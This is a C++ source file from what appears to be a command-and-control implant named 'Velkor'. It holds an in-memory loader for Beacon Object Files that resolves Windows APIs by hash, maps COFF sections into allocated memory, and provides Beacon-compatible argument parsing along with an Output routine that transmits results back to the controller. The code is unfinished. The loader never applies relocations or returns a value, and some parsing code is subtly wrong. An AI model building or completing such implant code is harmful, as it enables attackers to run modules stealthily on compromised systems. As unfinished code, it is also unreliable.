#include <Velkor.h>

namespace Coff {

    D_SEC( B ) VOID SymbolParser( PIMAGE_SYMBOL SymTable, ULONG SymCount, ULONG Type, UINT16 Idx ) {
        VELKOR_INSTANCE

        PSTR SymName = NULL;

        if ( SymTable[Idx].N.Name.Short ) {
            SymName = A_PTR( SymTable[Idx].N.ShortName );
        } else {
            SymName = A_PTR( ( SymTable + SymCount ) + SymTable[Idx].N.Name.Long  );
        }

        switch ( Type ) {

        case COFF_DEC_FUNC:
            if ( ISFCN( SymTable[Idx].Type ) )  {
                // do anything

                VkShow( "{BOF} Symbol Name: %s\n", SymName );
            }

            break;

        case COFF_IMP_FUNC:
            if ( VkStr::CompareCountA( "__imp_", SymName, 6 ) == 0 ) {
                // do anything

                VkShow( "{BOF} Symbol Name: %s\n", SymName );
            }
            
            break;

        case COFF_DEC_VAR:
            if ( 
                !ISFCN( SymTable[Idx].Type ) && 
                SymTable[Idx].StorageClass == IMAGE_SYM_CLASS_EXTERNAL &&
                VkStr::CompareCountA( "__imp_", SymName, 6 ) != 0 
            ) {
                // do anything

                VkShow( "{BOF} Symbol Name: %s\n", SymName );
            } 

            break;
        
        default: break;
        }
    }

    D_SEC( B ) PVOID ResolveSym( PSTR SymName, PVOID* SymPtr ) {
        VELKOR_INSTANCE

        PVOID ReturnSymbol = NULL;

        PSTR  TmpVal             = NULL;
        CHAR  FuncName[MAX_PATH] = { 0 };
        CHAR  LibName[MAX_PATH]  = { 0 };
        CHAR  Buff[MAX_PATH]     = { 0 };
        PVOID LibAddress         = NULL;

        SymName += 6;

        if ( VkStr::CompareCountA( "Beacon", SymName, 6 ) == 0 ) {
            for ( INT i = 0; i < sizeof( CoffCtx.BeaconApi ); i++ ) {
                if ( CoffCtx.BeaconApi[i].BeaconXprName == HashString( SymName, 0 ) ) {
                   ReturnSymbol = CoffCtx.BeaconApi[i].BeaconApiPtr;
                }
            }
        } else {
            VkMem::Zero( Buff,     MAX_PATH );
            VkMem::Zero( LibName,  MAX_PATH );
            VkMem::Zero( FuncName, MAX_PATH );
            VkMem::Copy( Buff, SymName, VkStr::LengthA( SymName ) );

            for ( INT i = 0; i < VkStr::LengthA( Buff ); i++ ) {
                if ( VkStr::CompareCountA(  &Buff[i], "$", 1 ) == 0 ) {
                    VkMem::Copy( &LibName,  &Buff[i] - 1, i );
                    VkMem::Copy( &FuncName, &Buff[i] + 1, VkStr::LengthA( &Buff[i] + 1 ) );
                    break;
                }
            }

            LibAddress = LdrLoadModule( HashString( LibName, 0 ) );
            if ( !LibAddress ) LibAddress = VkCall<PVOID>( XprKernel32, XPR( "LoadLibraryA" ), LibName );

            ReturnSymbol = LdrLoadFunc( LibAddress, HashString( FuncName, 0 ) );
        }

        return ReturnSymbol;
    }

    D_SEC( B ) BOOL Loader( PVOID CoffPtr, PSTR Function, PBYTE Args, ULONG Argc ) {
        VELKOR_INSTANCE

        COFF_DATA CoffData = { 0 };
        PVOID     MemAddr  = NULL;
        ULONG     MemSize  = 0;
        PVOID     SecAddr  = NULL;
        ULONG     SecSize  = 0;
        BOOL      Success  = FALSE;
        
        CoffData.Base      = CoffPtr;
        CoffData.SymTable  = (PIMAGE_SYMBOL)( CoffData.Base + CoffData.Header->PointerToSymbolTable );
        CoffData.SecHeader = (PIMAGE_SECTION_HEADER)( CoffData.Base + sizeof( IMAGE_FILE_HEADER ) );

        {
            for ( INT i = 0; i < CoffData.Header->NumberOfSections; i++ ) {
                MemSize += PAGE_ALIGN( CoffData.SecHeader[i].SizeOfRawData );
            }

            PSTR              SymName  = NULL;
            PIMAGE_RELOCATION SymReloc = { 0 };
            PIMAGE_SYMBOL     SymPtr   = { 0 };
            
            for ( INT x = 0; x < CoffData.Header->NumberOfSections; x++ ) {
                SymReloc = (PIMAGE_RELOCATION)( CoffData.Base + CoffData.SecHeader[x].PointerToRelocations );

                for ( INT y = 0; y < CoffData.SecHeader[x].NumberOfRelocations; y++ ) {
                    SymPtr = &CoffData.SymTable[SymReloc->SymbolTableIndex];

                    if ( SymPtr->N.Name.Short ) {
                        SymName = A_PTR( SymPtr->N.ShortName );
                    } else {
                        SymName = A_PTR( U_64( CoffData.SymTable + CoffData.Header->NumberOfSymbols ) + SymPtr->N.Name.Long );
                    }

                    if ( VkStr::CompareCountA( "__imp_", SymName, 6 ) == 0 ) {
                        MemSize += sizeof( PVOID );
                    }

                    SymReloc = (PIMAGE_RELOCATION)( SymReloc + sizeof( IMAGE_RELOCATION ) );
                }
            }

            PAGE_ALIGN( MemSize );
        }

        MemAddr = VkMem::Alloc( NULL, MemSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

        CoffData.SecMap = VkCall<PSEC_MAP>( 
            XprKernel32, XPR( "HeapAlloc" ), Velkor->Teb->ProcessEnvironmentBlock->ProcessHeap, 
            HEAP_ZERO_MEMORY, CoffData.Header->NumberOfSections * sizeof( SEC_MAP ) 
        );

        SecAddr = MemAddr;

        for ( INT i = 0; i < CoffData.Header->NumberOfSections; i++ ) {
            CoffData.SecMap[i].Size = SecSize = CoffData.SecHeader[i].SizeOfRawData;
            CoffData.SecMap[i].Base = SecAddr;

            VkMem::Copy( SecAddr, C_PTR( CoffData.Base + CoffData.SecHeader[i].PointerToRawData ), SecSize );

            SecAddr = C_PTR( PAGE_ALIGN( SecAddr + SecSize ) );
        }

        // CoffCtx.SymMap = SecAddr;
    }
}

namespace Beacon {

    D_SEC( B ) VOID DataParse( PDATAP Parser, PCHAR Buffer, INT Size ) {
        if ( !Parser ) return;

        Parser->Original = Buffer;
        Parser->Buffer   = Buffer;
        Parser->Length   = Size - 4;
        Parser->Size     = Size - 4;
        Parser->Buffer  += 4;

        return;
    }

    D_SEC( B ) INT DataInt( PDATAP Parser ) {
        INT FourByteInt = 0;
        
        if ( Parser->Length < 4 ) {
            return 0;
        }

        VkMem::Copy( &FourByteInt, Parser->Buffer, 4 );
        Parser->Buffer += 4;
        Parser->Length -= 4;

        return FourByteInt;
    }

    D_SEC( B ) SHORT DataShort( PDATAP Parser ) {
        SHORT RetVal = 0;

        VkMem::Copy( &RetVal, Parser->Buffer, 2 );
        Parser->Buffer += 2;
        Parser->Length -= 2;

        return RetVal;
    }

    D_SEC( B ) INT DataLength( PDATAP Parser ) {
        return Parser->Length;
    }

    D_SEC( B ) PCHAR DataExtract( PDATAP Parser, PINT Size ) {
        INT     Length  = 0;
        PCHAR   OutData = NULL;

        if ( Parser->Length < 4 ) {
            return NULL;
        }

        VkMem::Copy( &Length, Parser->Buffer, 4 );
        Parser->Buffer += 4;

        OutData = Parser->Buffer;

        if ( !OutData ) return NULL;

        Parser->Length -= 4;
        Parser->Length -= Length;
        Parser->Buffer += Length;

        if ( C_DEF32( Size ) != NULL && OutData ) {
            Size = &Length;
        }

        return OutData;
    }

    D_SEC( B ) VOID Output( INT Type, PCHAR Data, INT Length ) {
        VELKOR_INSTANCE

        VELKOR_PACKAGE = Package::Create( CodeOutput );
        
        Package::AddInt32( VELKOR_PACKAGE, Type );
        Package::AddBytes( VELKOR_PACKAGE, UC_PTR( Data ), Length );
        Package::Transmit( VELKOR_PACKAGE, NULL, 0 );

        VkShow( "{BOF} Beacon::Output: %s\n", Data );

        return;
    }

    D_SEC( B ) VOID Printf( INT Type, PCHAR Fmt, ... ) {
        return;
    }

}